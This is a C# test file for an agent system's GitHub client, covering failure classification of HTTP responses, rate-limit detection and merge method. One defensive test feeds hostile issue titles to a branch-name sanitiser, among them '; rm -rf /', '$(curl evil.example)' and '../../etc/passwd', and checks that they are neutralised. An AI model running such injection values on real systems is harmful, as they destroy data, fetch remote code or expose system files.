namespace AgentFactory.Tests.GitHub;

using System.Net;
using System.Net.Http.Headers;
using System.Reflection;
using AgentFactory.Failures;
using AgentFactory.GitHub;

/// <summary>
/// The merger's whole judgement about a GitHub answer, asserted as a table rather than
/// through the code paths that use it, because it is a table and every row of it is a
/// decision about whether a work item is ever tried again.
/// </summary>
public class GitHubResponseTests
{
    private static HttpResponseHeaders Headers(params (string Name, string Value)[] headers)
    {
        var response = new HttpResponseMessage();
        foreach (var (name, value) in headers)
        {
            response.Headers.TryAddWithoutValidation(name, value);
        }

        return response.Headers;
    }

    [Theory]
    // Permanent: the attempt happened and the answer was no.
    [InlineData(HttpStatusCode.Unauthorized, FailureClass.Permanent)]
    [InlineData(HttpStatusCode.Forbidden, FailureClass.Permanent)]
    [InlineData(HttpStatusCode.NotFound, FailureClass.Permanent)]
    [InlineData(HttpStatusCode.Conflict, FailureClass.Permanent)]
    [InlineData((HttpStatusCode)400, FailureClass.Permanent)]
    [InlineData((HttpStatusCode)422, FailureClass.Permanent)]
    [InlineData(HttpStatusCode.MethodNotAllowed, FailureClass.Permanent)]
    [InlineData(HttpStatusCode.UnsupportedMediaType, FailureClass.Permanent)]
    [InlineData(HttpStatusCode.Gone, FailureClass.Permanent)]

    // Transient: the attempt failed to happen. A 502 is a daemon that was not answering,
    // which is the definition of the class.
    [InlineData(HttpStatusCode.InternalServerError, FailureClass.Transient)]
    [InlineData(HttpStatusCode.BadGateway, FailureClass.Transient)]
    [InlineData(HttpStatusCode.ServiceUnavailable, FailureClass.Transient)]
    [InlineData(HttpStatusCode.GatewayTimeout, FailureClass.Transient)]
    [InlineData(HttpStatusCode.TooManyRequests, FailureClass.Transient)]
    public void A_status_code_alone_decides_the_class(HttpStatusCode status, FailureClass expected)
    {
        var refusal = GitHubResponse.Refusal(status, Headers(), """{"message": "no"}""", "doing something");

        Assert.Equal(expected, Failures.Classify(refusal));
    }

    [Fact]
    public void A_403_that_is_actually_a_rate_limit_is_transient_and_one_that_is_not_is_permanent()
    {
        // GitHub answers a rate limit with 403 as often as it does with 429, and the only
        // thing that tells them apart is a header giving a number. So the header decides,
        // and nothing else does: a 403 with no header is a token that may not do this, and
        // a 403 with one is a factory that asked too often.
        Assert.Equal(
            FailureClass.Transient,
            Failures.Classify(GitHubResponse.Refusal(
                HttpStatusCode.Forbidden,
                Headers(("X-RateLimit-Remaining", "0")),
                null,
                "merging")));

        Assert.Equal(
            FailureClass.Transient,
            Failures.Classify(GitHubResponse.Refusal(
                HttpStatusCode.Forbidden,
                Headers(("Retry-After", "60")),
                null,
                "merging")));

        // A secondary rate limit announces itself the same way, and a primary one by
        // spending the quota.
        Assert.True(GitHubResponse.IsRateLimited(Headers(("X-RateLimit-Remaining", "0"))));
        Assert.True(GitHubResponse.IsRateLimited(Headers(("Retry-After", "1"))));
        Assert.False(GitHubResponse.IsRateLimited(Headers(("X-RateLimit-Remaining", "4999"))));
        Assert.False(GitHubResponse.IsRateLimited(null));

        Assert.Equal(
            FailureClass.Permanent,
            Failures.Classify(GitHubResponse.Refusal(
                HttpStatusCode.Forbidden,
                Headers(("X-RateLimit-Remaining", "4999")),
                """{"message": "Resource not accessible by personal access token"}""",
                "merging")));
    }

    [Fact]
    public void A_404_is_permanent_and_says_so_without_guessing_which_404_it_was()
    {
        // GitHub answers 404 rather than 403 for a repository a token may not read, so this
        // one row covers "there is nothing there" and "you may not see it" — and both are
        // permanent, which is why the message names both rather than picking one.
        var refusal = GitHubResponse.Refusal(
            HttpStatusCode.NotFound,
            Headers(),
            """{"message": "Not Found"}""",
            "the open issues of NaniSoft/nexus");

        Assert.Contains("no such repository", refusal.Message, StringComparison.Ordinal);
        Assert.Contains("no such branch for this token to see", refusal.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void The_answer_is_never_read_to_decide_the_class_only_to_explain_it()
    {
        // A body that says every classification word there is, on a status code that means
        // one of them. The status code decides; the prose is carried because a reviewer
        // reading the board is owed GitHub's own account of what it objected to.
        foreach (var word in new[] { "transient", "try again later", "retry", "temporary", "rate limit exceeded" })
        {
            var refusal = GitHubResponse.Refusal(
                HttpStatusCode.NotFound,
                Headers(),
                $$"""{"message": "{{word}}"}""",
                "merging");

            Assert.Equal(FailureClass.Permanent, Failures.Classify(refusal));
            Assert.Contains(word, refusal.Message, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void A_failure_that_never_got_an_answer_is_transient_and_nothing_else()
    {
        // The transport cases, which are the reason the merger's own timeout exists at all
        // and the reason it belongs to the client rather than the loop: a name that would
        // not resolve, a connection refused, a socket dropped, a request that took longer
        // than the client will wait.
        var failed = new HttpRequestException("no such host is known");

        var refusal = GitHubResponse.Transport(failed, "opening a pull request");

        Assert.Equal(FailureClass.Transient, Failures.Classify(refusal));
        Assert.Contains("no such host is known", refusal.Message, StringComparison.Ordinal);
        Assert.Same(failed, refusal.InnerException);
    }

    [Fact]
    public void The_cases_this_table_cannot_decide_are_named_rather_than_guessed_at()
    {
        // #7's requirement is that the merger declares its failures, and the honest half of
        // that is saying where the declaration stops. Four things reach this client that no
        // status code decides, and each is named here and covered by a test elsewhere:
        // a 405 whose mergeable state does not explain it, a push git refused, a merge that
        // answered without saying it merged, and an answer that was not the shape the API
        // documents.
        //
        // The assertion is that the list cannot quietly shrink. It is documentation, and
        // documentation that is not checked is documentation that disappears.
        var unclassifiable = GitHubResponse.Unclassifiable;

        Assert.Equal(4, unclassifiable.Count);
        Assert.Contains(unclassifiable, entry => entry.Contains("405 on a merge", StringComparison.Ordinal));
        Assert.Contains(unclassifiable, entry => entry.StartsWith("A push that git refused", StringComparison.Ordinal));
        Assert.Contains(unclassifiable, entry => entry.StartsWith("A merge that answers 200", StringComparison.Ordinal));
        Assert.Contains(unclassifiable, entry => entry.StartsWith("A successful answer whose body", StringComparison.Ordinal));
        Assert.All(unclassifiable, entry => Assert.True(entry.Length > 40, $"'{entry}' is not an explanation"));
    }

    [Fact]
    public void A_pull_request_body_cannot_be_turned_into_shell_syntax_by_a_title()
    {
        // A brief reaches a worker container as a file for exactly this reason, and the same
        // reasoning applies here in a different direction: an issue's title is a stranger's
        // words, and the branch name it becomes is used in a URL, in a git refspec and in a
        // pull request body. Nothing may be able to leave the set of characters a git ref
        // component and a URL path segment are allowed to contain.
        foreach (var title in new[]
        {
            "; rm -rf /",
            "$(curl evil.example)",
            "`whoami`",
            "a && b | c ; d",
            "../../etc/passwd",
            "a\"b'c",
            "*",
        })
        {
            var branch = BranchName.For(42, title);

            Assert.Matches("^agent-factory/42-[a-z0-9-]*$", branch);
            Assert.All(branch, character =>
                Assert.True(
                    char.IsAsciiLetterOrDigit(character) || character is '-' or '/',
                    $"'{character}' is not a character a branch name may contain, and it came from the issue's title"));
        }
    }

    [Fact]
    public void The_pull_request_a_change_ships_as_is_a_merge_commit_and_not_a_squash()
    {
        // A squash would rewrite the round's commit, so the change on the base branch would
        // not be the commit the reviewer judged, and reverting it would not be one action
        // against one commit. The spec asks for a merge that can be reverted, and a merge
        // commit is the shape where that is literally true.
        Assert.Equal("merge", GitHubClient.MergeMethod);
    }
}
